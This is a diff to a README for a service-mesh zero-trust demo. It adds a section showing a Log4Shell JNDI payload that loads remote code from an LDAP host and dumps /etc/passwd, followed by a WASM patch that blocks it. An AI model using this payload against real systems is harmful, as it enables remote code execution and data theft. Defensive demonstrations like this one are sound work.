@@ -13,7 +13,7 @@ Platform. We will see:
 * How **targeted application policies** can be applied to affect only a subset
   of the applications in the mesh.
 
-The demo consists of a Java application that is vulnerable to the `Log4Shell`
+The demo consists of a [Java application](vulnerable-app) that is vulnerable to the `Log4Shell`
 exploit. We will use the service mesh to enforce that access is authenticated on the
 corporate Identity Provider, that only the right users and local services can access
 the application, and that malicious payloads that trigger the `Log4Shell` exploit
@@ -48,7 +48,7 @@ the corporate identity Provider:
 $ kubectl apply -f config/oidc-policy.yaml
 ```
 
-If you inspect the policy file you'll see that it applies to the `istio-ingressgateway`
+If you inspect [the policy](config/oidc-policy.yaml) file you'll see that it applies to the `istio-ingressgateway`
 and that it uses a `CUSTOM` target that delegates to the `authservice-grpc` provider.
 The provider is configured in The Istio global mesh config that you can check with:
 
@@ -90,7 +90,7 @@ Services in the cluster will no longer have direct access to it:
 $ kubectl apply -f config/runtime-authn.yaml
 ```
 
-If you inspect the contents of the policy you'll see that it applies to the `vulnerable` application and that
+If you inspect [the contents of the policy](config/runtime-authn.yaml) you'll see that it applies to the `vulnerable` application and that
 it only allows access from a specific source principal. That source principal matches the
 [SPIFEE identity](https://spiffe.io/docs/latest/spiffe-about/spiffe-concepts/#spiffe-id) of the Istio Ingress Gateway.
 
@@ -105,3 +105,78 @@ bash-5.1# exit
 
 Now we get an access denied, because the proxy sidecar in the application pod is rejecting the connection since the
 runtime identity presented by our workload does not match the configured one.
+
+## 4. Targeted application policy
+
+The deployed Java application is vulnerable to `Log4Shell`, as it uses a Java and `log4j` versions vulnerable to the
+popular CVEs. It logs the information in the JWT token without sanitizing it first, so it is easy to trigger it. To
+demonstrate the attach, let's inject some malicious payloads in the token by setting some claims in our User profile:
+
+* In the Auth0 amnagement console, go to **Users Management > Users**. Select your user and **Edit** the **Name** field.
+  Put the following value and save: `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
+* Open a new Browser window in incognito mode (to make sure there are no cookies, etc) adn log in again. You'll see a normal
+  output:
+  ```
+  Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
+  
+  Authenticated with token:
+  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJuaWNrbmFtZSI6ImlnbmFzaSt0ZXN0IiwibmFtZSI6IiR7am5kaTpsZGFwOi8vbG9nNHNoZWxsOjEzODkvZXhlYy9ZMkYwSUM5bGRHTXZjR0Z6YzNka0NnPT19IiwicGljdHVyZSI6Imh0dHBzOi8vcy5ncmF2YXRhci5jb20vYXZhdGFyLzA0NGMyNTUwOTg0MTYzYzk5NDc3Y2QzZDJiNjQ1ZWI0P3M9NDgwJnI9cGcmZD1odHRwcyUzQSUyRiUyRmNkbi5hdXRoMC5jb20lMkZhdmF0YXJzJTJGaWcucG5nIiwidXBkYXRlZF9hdCI6IjIwMjItMDEtMjRUMDg6MjM6NDguODY5WiIsImVtYWlsIjoiaWduYXNpK3Rlc3RAdGV0cmF0ZS5pbyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL25hY3gtZG16LmV1LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw2MWU3ZjQ1YTc2ZGMzYTAwNmFhZTUwZGIiLCJhdWQiOiJkeXlXMG1lNExxOG4zdFkzMEZhdHVEUUZYcHRadm00byIsImlhdCI6MTY0MzAxMjYyOSwiZXhwIjoxNjQzMDQ4NjI5LCJub25jZSI6IlQ5c2Q2LTZsNDlNVGRkUXFOLVJkeEplYmMwS1VsNk1OOVJmRWtkMVZVWjgifQ.FUi8ydGHDksc_B6YfmE-xCmSvdfOtroxJ5MOp5aern-JK3Qrcm0lYo4NNcxRdDg65AbS93hklexBRLBzfTd5B8jopiyzqmznMtafxV9rrH_ZS2-oBrfc-soLQf0r9d8T0tTnnidtfAbPSwNyv5zKiFHXxHGHoX-x6wjZahCt-pKk4uoCdTDGgCp2751yXF1FJSLcC8v8kiSC9lZhm7xJxVFvP19zZ30PadD9b_QOu3Xs-yOz2LxCXCXImQZvfuCV2YFOvVGimfKz35WeEf5RAeJZkxoHN6G3oXnbEwgIAdAl6r68Gj2LUbloy8XvKgJk7IIcsSlAwETiiPWdemP3ag
+  ```
+* However, if we inspect the application container logs we'll see something like:
+  ```
+  08:23:49.369 [qtp1316061703-14] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
+  08:23:49.535 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - token payload: {"sub":"auth0|61e7f45a76dc3a006aae50db","aud":"dyyW0me4Lq8n3tY30FatuDQFXptZvm4o","email_verified":true,"updated_at":"2022-01-24T08:23:48.869Z","nickname":"ignasi+test","name":"${jndi:ldap:\/\/log4shell:1389\/exec\/Y2F0IC9ldGMvcGFzc3dkCg==}","iss":"https:\/\/nacx-dmz.eu.auth0.com\/","exp":1643048629,"iat":1643012629,"nonce":"T9sd6-6l49MTddQqN-RdxJebc0KUl6MN9RfEkd1VUZ8","picture":"https:\/\/s.gravatar.com\/avatar\/044c2550984163c99477cd3d2b645eb4?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fig.png","email":"ignasi+test@tetrate.io"}
+  /!\ /!\ /!\ You have been pwned!
+  /!\ /!\ /!\ RCE exploit loaded
+  /!\ /!\ /!\ Executing: cat /etc/passwd
+  
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+  systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+  systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+  systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+  systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+  messagebus:x:104:108::/var/run/dbus:/bin/false
+  
+  08:23:49.537 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
+  ```
+
+At this point, the vulnerable application has processed the mailitious `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
+payload in the `name` claim of the JWT token, downloaded the exploit from `log4shell:1389`, and executed the `cat /etc/passwd` command
+that comes base64-encoded in the payload.
+
+To prevent this, we will deploy the [WASM patch](wasm-patch) to all the Java applications in the environment:
+
+```
+envsubst < config/wasm-patch.yaml | kubectl apply -f -
+```
+
+The [patch file](config/wasm-patch.yaml) sets the `selectors` so that the patch is deployed only to Java applications, and it instructs
+the mesh to apply the WASM filter to every HTTP request. We can now trefresh the page and this time we'll see the following:
+
+```
+Access Denied
+```
+
+We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we jsut deployed:
+
+```
+kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
+2022-01-24T08:35:18.968121Z	info	envoy wasm	wasm log zta-demo.log4shell-patch: access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}
+```
